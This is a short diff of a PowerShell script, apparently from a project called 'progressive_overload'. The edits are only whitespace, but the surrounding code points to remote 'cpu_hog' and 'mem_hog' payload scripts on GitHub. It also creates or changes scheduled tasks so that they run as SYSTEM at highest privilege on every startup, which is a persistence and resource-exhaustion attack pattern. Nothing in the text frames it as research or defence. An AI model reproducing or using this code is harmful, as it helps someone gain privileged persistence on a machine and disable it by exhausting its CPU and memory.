@@ -1,4 +1,4 @@
-param([string]$basePath)
+param( [string]$basePath )
 
 $cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.ps1"
 $memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.ps1"
@@ -91,7 +91,9 @@ function CheckTask-And-Recreate {
         if(-not $tsk){
             schtasks /create /tn $taskName /tr "$taskRunAction" /ru SYSTEM /rl HIGHEST /sc onstart /f
             schtasks /run /tn $taskName
-        }else{
+        }
+        
+        else{
             if($tsk -notcontains "Run As User:                          SYSTEM"){
                 schtasks /end /tn $taskName
                 schtasks /change /tn $taskName /ru SYSTEM /rl HIGHEST
